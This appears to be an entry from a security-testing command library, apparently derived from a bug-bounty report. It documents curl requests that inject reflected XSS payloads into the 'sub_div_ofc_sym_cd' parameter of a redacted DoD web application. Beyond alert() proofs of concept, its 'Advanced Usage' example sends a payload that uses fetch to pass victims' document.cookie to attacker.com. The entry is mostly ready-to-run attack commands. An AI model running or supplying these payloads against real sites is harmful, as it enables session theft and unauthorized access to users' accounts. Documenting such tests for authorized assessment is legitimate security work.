---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
data: >-
  curl -G "https://███████/███████=" --data-urlencode
  "sub_div_ofc_sym_cd=%3Csvg%2Fonload%3Dalert%28%27nagli%27%29%3E" -v
tags:
  - xss
  - web
  - testing
type: command
output: >-
  HTTP response with reflected payload in HTML body, e.g.,
  ...<svg/onload=alert('nagli')>...</svg>...
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T03:47:13.062Z'
verified: false
validated: true
submitted: true
---
# curl-reflected-xss-test

## Command

```bash
curl -G "https://███████/███████=" --data-urlencode "sub_div_ofc_sym_cd=%3Csvg%2Fonload%3Dalert%28%27nagli%27%29%3E" -v
```

## Description

This command uses curl to send a GET request to the vulnerable DoD web application endpoint, injecting a URL-encoded JavaScript payload into the 'sub_div_ofc_sym_cd' query parameter. It tests for reflected XSS by checking if the payload is echoed back unsanitized in the response, which would allow execution in a browser context.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-G` | Treats the following arguments as GET parameters | Yes |
| `--data-urlencode` | URL-encodes the data for the query parameter | Yes |
| `-v` | Verbose output to show request/response details | Yes |
| `sub_div_ofc_sym_cd` | The vulnerable query parameter name | Yes |
| Payload value | Encoded JavaScript, e.g., %3Csvg%2Fonload%3Dalert%28%27nagli%27%29%3E | Yes |

## Examples

### Basic Usage

```bash
curl -G "https://███████/███████=" --data-urlencode "sub_div_ofc_sym_cd=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" -v
```

### Advanced Usage

```bash
curl -G "https://███████/███████=" --data-urlencode "sub_div_ofc_sym_cd=%3Csvg%2Fonload%3Dfetch%28%27https%3A%2F%2Fattacker.com%2Fsteal%3Fcookie%3D%27%2Bdocument.cookie%29%3E" --cookie "session=abc123" -v
```

## Expected Output

Verbose curl output showing the HTTP request with query parameters, followed by the response body containing the reflected payload, such as HTML with `<svg/onload=alert('nagli')>` embedded without escaping. If vulnerable, no errors occur, and the payload is visible in the response.

## Related

- [[Related Procedure: Exploit-Reflected-XSS-in-sub_div_ofc_sym_cd-Parameter]]
